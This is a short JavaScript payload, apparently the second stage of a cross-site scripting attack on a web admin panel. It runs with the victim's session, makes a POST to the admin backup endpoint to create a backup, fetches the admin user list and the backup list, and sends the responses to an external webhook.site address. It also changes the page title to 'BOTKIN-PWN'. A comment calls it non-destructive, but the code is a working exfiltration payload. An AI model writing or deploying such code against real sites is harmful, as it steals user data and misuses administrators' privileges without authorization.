// Phase 2: prove write control. Deliberately non-destructive.
(function(){
  var B='https://webhook.site/eb446411-e24b-42b3-87e5-61b8645e1610';
  var tag='?h='+encodeURIComponent(location.host)+'&p2=1';
  function send(k,v){ try{ fetch(B+tag+'&k='+k+'&d='+encodeURIComponent(v),{mode:'no-cors'}); }catch(e){} }
  function get(u){ return fetch(u,{credentials:'same-origin'}).then(function(r){return r.text();}).catch(function(e){return 'ERR '+e;}); }
  document.title='BOTKIN-PWN';
  send('p2_hello','phase2 ran');
  fetch('/admin/api/backups',{method:'POST',credentials:'same-origin'})
    .then(function(r){return r.text();})
    .then(function(t){ send('p2_backup_created', t.slice(0,600)); })
    .catch(function(e){ send('p2_backup_err', String(e)); });
  get('/admin/api/users').then(function(t){ send('p2_users', t.slice(0,7000)); });
  setTimeout(function(){ get('/admin/api/backups').then(function(t){ send('p2_backup_list', t.slice(0,4000)); }); }, 1500);
})();
